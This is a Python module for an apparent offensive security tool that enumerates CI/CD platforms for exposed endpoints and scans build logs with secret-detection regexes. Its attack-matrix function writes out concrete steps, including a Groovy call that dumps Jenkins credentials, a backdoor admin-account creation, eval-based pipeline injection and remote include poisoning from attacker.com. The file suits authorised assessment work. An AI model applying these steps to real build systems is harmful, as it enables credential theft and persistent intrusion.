"""CI/CD Pipeline Enumeration Module.

Enumerates CI/CD platforms (Jenkins, GitLab, GitHub Actions) for:
- Exposed build logs with leaked secrets
- Misconfigured pipeline triggers (PRs from forks)
- Unauthenticated pipeline execution
- Build server credential stores
- Repository secrets accessible to pipeline YAML
- Artifact storage with sensitive build outputs
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from typing import Any

SECRET_PATTERNS: list[tuple[str, str, str]] = [
    (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^'\"&\s\n]+)['\"]?", "credential", "password"),
    (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([^'\"&\s\n]{16,})['\"]?", "credential", "api_key"),
    (r"(?i)(token|access_token|refresh_token)\s*[:=]\s*['\"]?([^'\"&\s\n]{16,})['\"]?", "credential", "token"),
    (r"(?i)(secret|private_key|ssh_key)\s*[:=]\s*['\"]?([^'\"&\s\n]{16,})['\"]?", "credential", "secret"),
    (r"(?i)(aws_access_key_id\s*[:=]\s*['\"]?AKIA[^'\"&\s\n]+)", "credential", "aws_key"),
    (r"(?i)(docker[_-]?password|registry[_-]?pass)\s*[:=]\s*['\"]?([^'\"&\s\n]+)", "credential", "docker"),
    (r"(?i)(connectionString)\s*[:=]\s*['\"]?([^'\"&\s\n]{20,})['\"]?", "credential", "database"),
    (r"(?i)(NUGET_KEY|NPM_TOKEN|PYPI_TOKEN)\s*[:=]\s*['\"]?([^'\"&\s\n]+)", "credential", "package_registry"),
    (r"(?i)(SLACK_TOKEN|TELEGRAM_TOKEN|DISCORD_WEBHOOK)\s*[:=]\s*['\"]?([^'\"&\s\n]+)", "credential", "webhook"),
]


@dataclass
class CICDFinding:
    platform: str
    url: str
    finding_type: str
    severity: str
    description: str
    evidence: str = ""
    mitre: str = ""


class CICDEnumerator:
    """Enumerate CI/CD platforms for security misconfigurations.

    Supports Jenkins, GitLab CI, GitHub Actions, Bitbucket Pipelines,
    and Azure DevOps.

    Args:
        target_url: Base URL of the CI/CD platform.
        sessions_dir: Directory for discovery output.
    """

    def __init__(self, target_url: str = "", sessions_dir: str = "sessions"):
        self.target_url = target_url.rstrip("/")
        self.sessions_dir = sessions_dir
        self.findings: list[CICDFinding] = []
        os.makedirs(sessions_dir, exist_ok=True)

    def scan(self) -> list[CICDFinding]:
        """Run all CI/CD scans.

        Returns:
            List of CICDFinding objects.
        """
        self._check_jenkins()
        self._check_gitlab()
        self._check_github_actions()
        self._check_azure_devops()
        self._check_bitbucket()
        return self.findings

    def _check_jenkins(self):
        jenkins_endpoints = [
            ("/script", "Script Console", "high",
             "Jenkins Script Console may be accessible. Allows arbitrary Groovy execution."),
            ("/configureSecurity/", "Security Configuration", "high",
             "Jenkins security configuration may be exposed."),
            ("/credentials/store/system/domain/_/", "Credential Store", "critical",
             "Jenkins credential store may list stored credentials."),
            ("/computer/", "Agent List", "medium",
             "Jenkins build agents enumeration. Check for agent secrets."),
            ("/api/json", "API Unauthenticated", "high",
             "Jenkins API may be accessible without authentication."),
            ("/job/", "Job Enumeration", "medium",
             "Jenkins jobs may be listable. Check pipeline scripts for secrets."),
            ("/log/", "System Logs", "high",
             "Jenkins logs may contain credentials from build output."),
            ("/userContent/", "User Content", "medium",
             "Jenkins user content directory. Check for uploaded artifacts."),
            ("/lastCompletedBuild/consoleText", "Build Console Output", "high",
             "Fetch build console output for secrets in build logs."),
            ("/pluginManager/", "Plugin Manager", "low",
             "Jenkins plugin enumeration for known CVEs."),
        ]

        for path, name, severity, desc in jenkins_endpoints:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="jenkins",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1190",
            ))

    def _check_gitlab(self):
        gitlab_endpoints = [
            ("/api/v4/projects?visibility=public", "Public Projects", "low",
             "GitLab public project enumeration via API."),
            ("/api/v4/projects?private_token=", "API Accessible", "critical",
             "GitLab API may accept unauthenticated requests."),
            ("/explore", "Explore Projects", "low",
             "GitLab explore page may reveal internal projects."),
            ("/help", "Instance Information", "low",
             "GitLab instance version and configuration details."),
            ("/api/v4/version", "Version API", "low",
             "GitLab version enumeration for CVE matching."),
            ("/api/v4/ci/lint", "CI Lint API", "high",
             "GitLab CI lint API may execute arbitrary YAML. Check for exposed CI/CD variables."),
            ("/api/v4/runners", "Runner Enumeration", "medium",
             "GitLab runner enumeration may reveal runner tokens."),
            ("/api/v4/groups", "Group Enumeration", "medium",
             "GitLab group enumeration."),
            ("/admin/runners", "Runner Administration", "critical",
             "GitLab runner admin page. Registration tokens may be exposed."),
            ("/-/graphql-explorer", "GraphQL Explorer", "medium",
             "GitLab GraphQL API explorer may be accessible."),
        ]

        for path, name, severity, desc in gitlab_endpoints:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="gitlab",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1190",
            ))

        gitlab_ci_secrets = [
            ('/.gitlab-ci.yml', "CI Pipeline Config", "high",
             "GitLab CI YAML — check for hardcoded CI/CD variables and secrets."),
            ("/ci/lint", "Pipeline Lint", "high",
             "Test pipeline YAML injection and variable leakage."),
        ]
        for path, name, severity, desc in gitlab_ci_secrets:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="gitlab_ci",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1552",
            ))

    def _check_github_actions(self):
        actions_endpoints = [
            ("/.github/workflows/", "Workflow Enumeration", "high",
             "GitHub Actions workflow YAML files. Check for hardcoded secrets, shell injection, and untrusted PR triggers."),
            ("/actions", "Actions Tab", "medium",
             "GitHub Actions page. Build logs may leak secrets via printenv."),
            ("/security/secret-scanning", "Secret Scanning Results", "critical",
             "GitHub Advanced Security secret scanning findings."),
            ("/settings/secrets/actions", "Repository Secrets", "critical",
             "GitHub Actions secrets configuration page."),
            ("/settings/environments", "Environment Protection Rules", "high",
             "Check for environments without required reviewers."),
        ]
        for path, name, severity, desc in actions_endpoints:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="github_actions",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1552",
            ))

    def _check_azure_devops(self):
        azdo_endpoints = [
            ("/_apis/projects", "Project Enumeration API", "medium",
             "Azure DevOps project enumeration via REST API."),
            ("/_apis/build/definitions", "Build Definitions API", "high",
             "Build pipeline definitions — check for exposed secrets in YAML."),
            ("/_apis/distributedtask/variablegroups", "Variable Groups API", "critical",
             "Library variable groups — may contain secrets in plaintext."),
            ("/_apis/serviceendpoint/endpoints", "Service Connections API", "critical",
             "Service connections — subscription, registry, and git credentials."),
            ("/_settings/agentpools", "Agent Pools", "medium",
             "Build agent pool configuration."),
        ]
        for path, name, severity, desc in azdo_endpoints:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="azure_devops",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1528",
            ))

    def _check_bitbucket(self):
        bb_endpoints = [
            ("/rest/api/1.0/projects", "Project Enumeration", "low",
             "Bitbucket project enumeration via REST API."),
            ("/rest/api/1.0/projects/~/repos", "Repository Enumeration", "medium",
             "Bitbucket repository enumeration."),
            ("/plugins/servlet/ssh/projects", "SSH Key Management", "high",
             "Bitbucket SSH key configuration."),
            ("/rest/api/1.0/admin/permissions/users", "User Permissions", "medium",
             "Bitbucket user permission enumeration."),
            ("/bitbucket-pipelines.yml", "Pipeline Config", "high",
             "Bitbucket Pipelines configuration. Check for hardcoded secrets."),
        ]
        for path, name, severity, desc in bb_endpoints:
            full_url = f"{self.target_url}{path}"
            self.findings.append(CICDFinding(
                platform="bitbucket",
                url=full_url,
                finding_type=name,
                severity=severity,
                description=desc,
                mitre="T1190",
            ))

    def scan_build_log(self, log_content: str, source: str = "") -> list[dict[str, str]]:
        """Scan a build log for leaked secrets.

        Args:
            log_content: Raw build log text.
            source: Description of the log source.

        Returns:
            List of dicts with matched secrets.
        """
        findings: list[dict[str, str]] = []
        for pattern, category, secret_type in SECRET_PATTERNS:
            for match in re.finditer(pattern, log_content):
                value = match.group(0)
                masked = value[:20] + "..." if len(value) > 20 else value
                findings.append({
                    "type": secret_type,
                    "category": category,
                    "source": source,
                    "evidence": masked,
                })
        return findings

    def generate_ci_attack_matrix(self) -> str:
        """Generate a comprehensive CI/CD attack matrix.

        Returns:
            Path to the JSON attack matrix file.
        """
        matrix = {
            "jenkins": {
                "credential_access": [
                    "/credentials/store/system/domain/_/ — Stored credentials",
                    "/script — Groovy script: com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials()",
                    "Jenkinsfile — 'withCredentials' blocks write secrets to workspace files",
                ],
                "code_execution": [
                    "/script — Arbitrary Groovy code execution",
                    "Pipeline job — 'sh' step with injectable parameters",
                    "Shared library — Pipeline shared library poisoning",
                ],
                "persistence": [
                    "Create admin user: Jenkins.instance.securityRealm.createAccount('backdoor','pass')",
                    "Install malicious plugin: PluginManager.install()",
                    "Backdoor in Global Pipeline Libraries",
                ],
            },
            "gitlab_ci": {
                "credential_access": [
                    "CI/CD Variables — /api/v4/projects/:id/variables",
                    "Pipeline triggers — /api/v4/projects/:id/triggers",
                    "Registry credentials — .gitlab-ci.yml DOCKER_AUTH_CONFIG",
                ],
                "code_execution": [
                    "Pipeline YAML injection — 'script: eval ${{INJECTED}}'",
                    "Custom executor — GitLab Runner custom executor",
                    "Include directive poisoning — include:remote: attacker.com/ci.yml",
                ],
                "persistence": [
                    "Schedule pipeline: /api/v4/projects/:id/pipeline_schedules",
                    "Deploy key: /api/v4/projects/:id/deploy_keys",
                    "Webhook: /api/v4/projects/:id/hooks",
                ],
            },
            "github_actions": {
                "credential_access": [
                    "printenv — Dump all environment variables (includes secrets)",
                    "GITHUB_TOKEN — Has write access to repository",
                    "ACTIONS_RUNNER_DEBUG — Enable debug to print secrets",
                    "OIDC token — Exchange for cloud provider credentials",
                ],
                "code_execution": [
                    "Pull_request_target + checkout — Untrusted code with secrets",
                    "Workflow_dispatch with inputs — Inject shell commands",
                    "Reusable workflow poisoning — Caller controls called workflow",
                ],
                "persistence": [
                    "Self-hosted runner — Persistent access to runner machine",
                    "Repository dispatch — Create webhook events",
                    "Deployment environment — Approval bypass",
                ],
            },
        }
        output_path = os.path.join(self.sessions_dir, "cicd_attack_matrix.json")
        with open(output_path, "w") as f:
            json.dump(matrix, f, indent=2)
        return output_path

    def export_findings(self) -> str:
        """Export CI/CD findings to a JSON file.

        Returns:
            Path to the findings file.
        """
        output_path = os.path.join(self.sessions_dir, "cicd_findings.json")
        findings_list = [
            {
                "platform": f.platform, "url": f.url,
                "type": f.finding_type, "severity": f.severity,
                "description": f.description, "mitre": f.mitre,
            }
            for f in self.findings
        ]
        with open(output_path, "w") as f:
            json.dump(findings_list, f, indent=2)
        return output_path


__all__ = ["CICDEnumerator", "CICDFinding", "SECRET_PATTERNS"]
